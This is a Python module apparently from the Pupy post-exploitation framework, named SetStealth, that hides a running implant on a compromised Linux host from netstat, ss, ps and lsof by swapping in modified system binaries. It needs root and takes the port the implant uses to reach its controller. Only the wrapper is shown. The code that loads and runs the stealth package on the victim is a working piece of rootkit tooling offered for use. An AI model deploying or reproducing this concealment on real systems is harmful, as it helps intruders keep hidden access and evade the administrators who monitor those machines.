#!/usr/bin/env python
from pupylib.PupyModule import *

__class_name__="SetStealth"

@config(cat="manage", compat="unix")
class SetStealth(PupyModule):
	"""Hides the runnin process from netstat, ss, ps, lsof by using modified binaries. Be careful when choosing the port.
Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/

********************** /!\ WARNING /!\ **********************
* Do NOT run the stealh module more than ONCE on a machine. *
* Running it two times will brake the binaries.			 *
*************************************************************
NOTE: The pp.py script needs to be running with root privileges in order to run this module."""
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=self.__doc__)
		self.arg_parser.add_argument('port', type=int, help='The port number to which Pupy is connecting to.')
 
	def is_compatible(self):
		a,r=super(SetStealth, self).is_compatible()
		if not a:
			return False, r
		if self.client.conn.modules['subprocess'].check_output(r"ls -l `dirname \`which netstat\``/net*tat | wc -l", shell=True).strip() == "2":
			return False, "It looks like this module has already been run on this machine."
		return True, ""

	def run(self, args):
		self.client.load_package("linux_stealth")
		self.client.conn.modules['linux_stealth'].run(str(args.port))
		self.success("Module executed successfully.")
